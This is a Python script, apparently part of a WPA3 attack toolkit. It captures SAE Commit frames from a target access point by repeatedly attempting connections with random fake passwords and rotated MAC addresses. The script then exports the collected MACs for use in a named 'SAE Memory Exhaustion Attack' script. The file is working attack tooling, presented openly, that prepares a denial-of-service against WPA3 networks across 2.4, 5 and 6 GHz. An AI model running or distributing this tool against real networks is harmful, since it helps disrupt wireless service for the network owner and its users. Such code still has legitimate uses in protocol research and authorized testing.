#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
Known MAC Address Capture for SAE Memory Exhaustion Attack - v2 (2.4 / 5 / 6 GHz)
================================================================================
Captures the source MAC addresses of valid SAE Commit frames (algo=3, seqnum=1)
sent to a target WPA3 Access Point. Triggers fast single-frequency SAE connection
attempts with randomized Unicast MACs via wpa_supplicant and sniffs the resulting
Commit frames on a monitor interface.

FEATURES:
- Full 2.4 GHz, 5 GHz, and 6 GHz (Wi-Fi 6E / Wi-Fi 7) support via 'iw ... set freq'
- Mandatory 6 GHz SAE Hash-to-Element (H2E / sae_pwe=1) and freq_list locking
  (prevents multi-second full-spectrum scan timeouts)
- Native Unicast MAC randomization via 'ip link' (no macchanger dependency required)
- Exports ready-to-paste KNOWN_STA_MACS_* list AND updates sae_params.json
================================================================================
"""
import os
import sys
import json
import time
import random
import string
import argparse
import subprocess
from scapy.all import AsyncSniffer, Dot11, Dot11Auth

# ========================= DEFAULT CONFIGURATION =========================
MONITOR_IFACE    = "wlan0mon"                 # Monitor mode interface for sniffing
MANAGED_IFACE    = "wlan1"                    # Managed mode interface for wpa_supplicant
TARGET_SSID      = "Your_WiFi_Name"
TARGET_BSSID     = "AA:BB:CC:DD:EE:11".lower()
TARGET_BAND      = "5GHz"                     # Options: "2.4GHz", "5GHz", "6GHz"
TARGET_CHANNEL   = "36"                       # Channel number in the target band
NUM_MACS         = 20
JSON_OUTPUT_FILE = "sae_params.json"
# =========================================================================


def run_cmd(cmd: list, timeout: int = 5) -> bool:
    """Executes a system command safely without shell injection."""
    try:
        res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout)
        return res.returncode == 0
    except Exception:
        return False


def get_unicast_rand_mac() -> str:
    """Generates a valid Locally Administered Unicast MAC address (Bit 0 = 0, Bit 1 = 1)."""
    b = [random.randint(0x00, 0xff) for _ in range(6)]
    b[0] = (b[0] & 0xfe) | 0x02
    return ":".join(f"{x:02x}" for x in b)


def get_freq(channel: str, band: str) -> int:
    """Converts channel number and band (2.4GHz, 5GHz, 6GHz) to center frequency in MHz."""
    ch = int(channel)
    band_norm = band.upper()
    if band_norm == "2.4GHZ":
        return 2484 if ch == 14 else 2407 + (ch * 5)
    elif band_norm == "5GHZ":
        return 5000 + (ch * 5)
    elif band_norm == "6GHZ":
        return 5935 if ch == 2 else 5950 + (ch * 5)
    raise ValueError(f"Unsupported band: {band}")


def setup_monitor_iface(mon_iface: str, freq: int, channel: str):
    """Configures monitor interface and locks it to the target frequency (supports 6 GHz)."""
    print(f"[*] Configuring {mon_iface} in Monitor mode on {freq} MHz (Channel {channel})...")
    run_cmd(["ip", "link", "set", mon_iface, "down"])
    run_cmd(["iw", "dev", mon_iface, "set", "type", "monitor"])
    run_cmd(["ip", "link", "set", mon_iface, "up"])
    time.sleep(0.3)

    if not run_cmd(["iw", "dev", mon_iface, "set", "freq", str(freq)]):
        # Fallback for legacy 2.4/5GHz drivers
        run_cmd(["iw", "dev", mon_iface, "set", "channel", str(channel)])
    time.sleep(0.2)


def rotate_managed_mac_and_clean(iface: str):
    """Stops interfering processes and assigns a fresh Unicast MAC to the managed interface."""
    run_cmd(["killall", "-9", "wpa_supplicant"])
    ctrl_path = f"/var/run/wpa_supplicant/{iface}"
    if os.path.exists(ctrl_path):
        try:
            os.remove(ctrl_path)
        except OSError:
            pass

    new_mac = get_unicast_rand_mac()
    run_cmd(["ip", "link", "set", iface, "down"])
    time.sleep(0.1)
    if not run_cmd(["ip", "link", "set", "dev", iface, "address", new_mac]):
        run_cmd(["macchanger", "-r", iface])
    run_cmd(["ip", "link", "set", iface, "up"])
    time.sleep(0.3)


def save_macs_to_json(filepath: str, band: str, mac_list: list):
    """Saves/merges captured known MACs into sae_params.json."""
    data = {}
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = {}

    if band not in data:
        data[band] = {"scalars": {}, "finites": {}, "known_macs": []}
    data[band]["known_macs"] = mac_list

    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Saved {len(mac_list)} MACs to '{filepath}' under '{band}.known_macs'.")
    except Exception as e:
        print(f"[!] Could not write JSON file '{filepath}': {e}")


def main():
    parser = argparse.ArgumentParser(description="Known MAC Address Capture for WPA3-SAE (2.4 / 5 / 6 GHz)")
    parser.add_argument("--monitor-iface", type=str, default=MONITOR_IFACE, help="Monitor interface (e.g. wlan0mon)")
    parser.add_argument("--managed-iface", type=str, default=MANAGED_IFACE, help="Managed interface (e.g. wlan1)")
    parser.add_argument("--ssid", type=str, default=TARGET_SSID, help="Target AP SSID")
    parser.add_argument("--bssid", type=str, default=TARGET_BSSID, help="Target AP BSSID")
    parser.add_argument("--band", type=str, choices=["2.4GHz", "5GHz", "6GHz"], default=TARGET_BAND, help="Target band")
    parser.add_argument("--channel", type=str, default=TARGET_CHANNEL, help="Target channel number")
    parser.add_argument("--num-macs", type=int, default=NUM_MACS, help="Number of unique MACs to capture")
    parser.add_argument("--json-out", type=str, default=JSON_OUTPUT_FILE, help="Output JSON file path")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("[!] Root privileges required (sudo).")

    mon_iface = args.monitor_iface
    mgd_iface = args.managed_iface
    ssid = args.ssid
    bssid = args.bssid.lower()
    band = args.band
    channel = args.channel
    num_macs = args.num_macs

    freq = get_freq(channel, band)
    sae_pwe_val = 1 if band == "6GHz" else 2

    print("[*] Stopping NetworkManager and unblocking RF-kill...")
    run_cmd(["rfkill", "unblock", "all"])
    run_cmd(["systemctl", "stop", "NetworkManager"])
    run_cmd(["systemctl", "stop", "wpa_supplicant"])
    time.sleep(0.5)

    setup_monitor_iface(mon_iface, freq, channel)
    rotate_managed_mac_and_clean(mgd_iface)

    captured_macs = set()

    def handle_packet(pkt):
        if pkt.haslayer(Dot11) and pkt.haslayer(Dot11Auth):
            # Verify frame is an Authentication frame (type=0, subtype=11) using SAE (algo=3, seq=1)
            if pkt.type == 0 and pkt.subtype == 11 and pkt[Dot11Auth].algo == 3 and pkt[Dot11Auth].seqnum == 1:
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                if addr1 == bssid and addr2 and addr2 != bssid and addr2 not in captured_macs:
                    captured_macs.add(addr2)
                    print(f"[+] Captured SAE Commit from {addr2} (Total: {len(captured_macs)}/{num_macs})")

    print(f"[*] Starting capture on {band} Channel {channel} ({freq} MHz)")
    print(f"[*] Target BSSID: {bssid} | SAE PWE: {sae_pwe_val}")

    conf_path = "/tmp/temp_known_macs.conf"
    attempt = 0

    try:
        while len(captured_macs) < num_macs:
            attempt += 1
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

            conf = f"""ctrl_interface=/var/run/wpa_supplicant
sae_groups=19
sae_pwe={sae_pwe_val}

network={{
    ssid="{ssid}"
    scan_ssid=1
    bssid={bssid}
    sae_password="{password}"
    key_mgmt=SAE
    proto=RSN
    ieee80211w=2
    freq_list={freq}
}}
"""
            with open(conf_path, "w", encoding="utf-8") as f:
                f.write(conf)

            print(f"[*] Attempt {attempt}: triggering SAE Commit with fake password '{password}'...")

            sniffer = AsyncSniffer(
                iface=mon_iface,
                prn=handle_packet,
                stop_filter=lambda _: len(captured_macs) >= num_macs,
                timeout=6
            )
            sniffer.start()
            time.sleep(0.3)

            wpa = subprocess.Popen(
                ["wpa_supplicant", "-i", mgd_iface, "-c", conf_path],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            sniffer.join()

            if wpa.poll() is None:
                wpa.terminate()
                try:
                    wpa.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    wpa.kill()

            rotate_managed_mac_and_clean(mgd_iface)

        sorted_macs = sorted(captured_macs)
        save_macs_to_json(args.json_out, band, sorted_macs)

        band_suffix = band.upper().replace(".", "_")
        print("\n" + "=" * 60)
        print(f"Capture finished. Collected {len(sorted_macs)} unique MAC addresses.")
        print("Copy the following lines into wpa3_sae_formal_attacks_v2.py:")
        print(f"\nKNOWN_STA_MACS_{band_suffix} = [")
        for mac in sorted_macs:
            print(f'    "{mac}",')
        print("]")
        print("=" * 60 + "\n")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        if captured_macs:
            save_macs_to_json(args.json_out, band, sorted(captured_macs))
    finally:
        if os.path.exists(conf_path):
            try:
                os.remove(conf_path)
            except OSError:
                pass
        print("[*] Restarting NetworkManager...")
        run_cmd(["systemctl", "start", "NetworkManager"])


if __name__ == "__main__":
    main()
